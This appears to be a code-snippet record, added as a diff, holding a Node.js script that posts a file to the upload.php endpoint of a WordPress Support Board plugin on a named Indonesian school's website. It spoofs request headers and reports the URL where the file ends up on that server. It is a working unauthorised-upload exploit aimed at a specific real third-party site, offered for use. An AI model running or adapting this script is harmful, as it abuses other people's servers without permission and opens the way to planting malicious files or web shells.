@@ -1,0 +1,53 @@
+nama=Upload File To Smkn 1 Nganjuk
+language=javascript
+lines=49
+date=01/11/2025
+code=const fs = require("fs")
+const path = require("path")
+const fetch = require("node-fetch")
+const FormData = require("form-data")
+
+function formatBytes(bytes) {
+  if (bytes === 0) return "0 Bytes"
+  const k = 1024
+  const sizes = ["Bytes", "KB", "MB", "GB", "TB"]
+  const i = Math.floor(Math.log(bytes) / Math.log(k))
+  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i]
+}
+
+async function uploadToTarget(filePath) {
+  const buffer = fs.readFileSync(filePath)
+  const fileName = path.basename(filePath)
+  const form = new FormData()
+  form.append("file", buffer, { filename: fileName, contentType: "application/octet-stream" })
+  const headers = form.getHeaders()
+  headers["X-Requested-With"] = "XMLHttpRequest"
+  headers["User-Agent"] = "curl/8.15.0"
+  const resp = await fetch("https://smkn1nganjuk.sch.id/wp-content/plugins/supportboard/supportboard/include/upload.php", {
+    method: "POST",
+    headers,
+    body: form
+  })
+  const text = await resp.text()
+  if (!resp.ok) throw new Error(`HTTP ${resp.status}: ${text}`)
+  try {
+    const json = JSON.parse(text)
+    if (Array.isArray(json) && json[0] === "success") {
+      return { success: true, url: json[1].replace(/\\\//g, "/"), size: formatBytes(buffer.length) }
+    } else {
+      return { success: false, raw: text }
+    }
+  } catch {
+    return { success: false, raw: text }
+  }
+}
+
+;(async () => {
+  const filePath = "ivDgpTFU.png"
+  try {
+    const result = await uploadToTarget(filePath)
+    console.log(JSON.stringify(result, null, 2))
+  } catch (err) {
+    console.log(JSON.stringify({ success: false, error: err.message }))
+  }
+})()
